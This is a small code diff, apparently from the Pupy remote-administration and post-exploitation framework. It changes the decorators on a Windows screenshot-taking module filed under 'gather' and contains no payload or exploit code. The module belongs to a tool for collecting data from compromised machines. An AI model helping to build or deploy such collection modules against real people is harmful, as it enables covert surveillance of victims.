@@ -37,8 +37,7 @@ def pil_save(filename, pixels, width, height):
 	logging.info('Screenshot saved to %s'%filename)
 
 
-@compatibility("windows")
-@category("gather")
+@config(cat="gather", compat="windows")
 class Screenshoter(PupyModule):
 	""" take a screenshot :) """
 
